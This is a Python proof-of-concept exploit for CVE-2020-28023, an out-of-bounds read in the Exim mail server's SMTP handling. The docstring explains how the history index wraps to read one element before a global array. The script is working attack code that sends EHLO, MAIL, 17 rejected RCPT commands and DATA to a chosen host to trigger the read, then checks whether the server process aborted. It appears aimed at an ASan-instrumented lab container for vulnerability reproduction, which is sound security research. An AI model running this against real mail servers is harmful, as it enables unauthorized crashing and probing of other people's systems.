#!/usr/bin/env python3
"""PoC for CVE-2020-28023 - Exim out-of-bounds READ in smtp_setup_msg().

CWE-125 global-buffer-underflow. The HAD(n) macro in src/smtp_in.c advances
smtp_ch_index through the global circular array smtp_connection_had[20],
wrapping to 0 at SMTP_HBUFF_SIZE. When a DATA/BDAT command arrives with no
valid prior RCPT and smtp_ch_index has just wrapped to 0, the "Valid RCPT
command must precede ..." error path reads:

    smtp_connection_had[smtp_ch_index - 1]   ==  smtp_connection_had[-1]

i.e. one element BEFORE a global array. ASan instruments globals with
redzones, so this underflow READ aborts the child process natively.

Every command runs HAD(...) exactly once, incrementing smtp_ch_index:
    EHLO  -> +1
    MAIL  -> +1
    RCPT  -> +1   (fires even when the RCPT is rejected by ACL)
    DATA  -> +1

SMTP_HBUFF_SIZE == 20. We need smtp_ch_index == 19 right BEFORE DATA so that
DATA's HAD() bumps it to 20 -> wraps to 0 -> the error path reads index -1.

    EHLO(+1) + MAIL(+1) = idx 2
    need idx 19 before DATA  ->  17 RCPTs   (2 + 17 = 19)
    DATA(+1)  ->  idx 20 -> wraps to 0  ->  smtp_connection_had[-1]

We send 17 rejected RCPTs by default (every RCPT TO a non-local domain is
rejected by the container's RCPT ACL but still counts via HAD).

FOR AUTHORIZED SECURITY TESTING ONLY.
"""

import socket
import sys
import time

# 2 (EHLO+MAIL) + N rcpts must equal 19 so DATA's HAD wraps idx 20 -> 0.
# SMTP_HBUFF_SIZE = 20, so N = 17.
RCPT_COUNT = 17


def recv_line(sock, timeout=5.0):
    sock.settimeout(timeout)
    data = b""
    try:
        while b"\n" not in data:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
    except socket.timeout:
        pass
    return data


def send_cmd(sock, line, read=True):
    sock.sendall(line + b"\r\n")
    if read:
        resp = recv_line(sock)
        return resp
    return b""


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 18029
    rcpts = int(sys.argv[3]) if len(sys.argv) > 3 else RCPT_COUNT

    print(f"[*] CVE-2020-28023 PoC -> {host}:{port}")
    print(f"[*] Sending EHLO + MAIL + {rcpts} rejected RCPTs + DATA")
    print(f"[*] (need smtp_ch_index == 19 before DATA; 2 + {rcpts} = {2 + rcpts})")

    try:
        sock = socket.create_connection((host, port), timeout=10)
    except OSError as exc:
        print(f"[!] connect failed: {exc}")
        return 2

    banner = recv_line(sock)
    print(f"[<] banner: {banner.decode(errors='replace').strip()}")
    if not banner.startswith(b"220"):
        print("[!] no 220 banner - is the exim daemon up?")

    resp = send_cmd(sock, b"EHLO poc.test")
    print(f"[<] EHLO: {resp.decode(errors='replace').strip()[:120]}")

    resp = send_cmd(sock, b"MAIL FROM:<attacker@poc.test>")
    print(f"[<] MAIL: {resp.decode(errors='replace').strip()}")

    # Each RCPT to a non-local domain is rejected by ACL but HAD() still fires.
    for i in range(rcpts):
        resp = send_cmd(sock, b"RCPT TO:<victim@nonlocal.invalid>")
        tag = resp.decode(errors="replace").strip()[:60]
        if i < 3 or i >= rcpts - 2:
            print(f"[<] RCPT {i + 1}/{rcpts}: {tag}")
        elif i == 3:
            print(f"[<] RCPT 4..{rcpts - 2}: (rejected, suppressed)")

    print("[>] DATA  (should trigger smtp_connection_had[-1] read under ASan)")
    sock.sendall(b"DATA\r\n")
    resp = recv_line(sock, timeout=6.0)
    if resp:
        print(f"[<] DATA reply: {resp.decode(errors='replace').strip()}")
    else:
        print("[<] no reply / connection closed (child likely ASan-aborted)")

    # A second probe: if the connection is dead the child crashed.
    time.sleep(0.5)
    try:
        sock.sendall(b"NOOP\r\n")
        follow = recv_line(sock, timeout=3.0)
        if follow:
            print(f"[<] post-DATA NOOP: {follow.decode(errors='replace').strip()}")
            print("[?] connection still alive - check docker logs for ASan trace")
        else:
            print("[+] connection dead after DATA -> child process aborted")
    except OSError:
        print("[+] socket error after DATA -> child process aborted")

    try:
        sock.close()
    except OSError:
        pass

    print()
    print("[*] Verify the crash in the daemon logs:")
    print("      docker logs <container>   # look for:")
    print("      'AddressSanitizer: global-buffer-overflow'")
    print("      READ ... in smtp_setup_msg ... smtp_in.c")
    print("      '... is located 1 bytes before global variable")
    print("       smtp_connection_had'")
    return 0


if __name__ == "__main__":
    sys.exit(main())
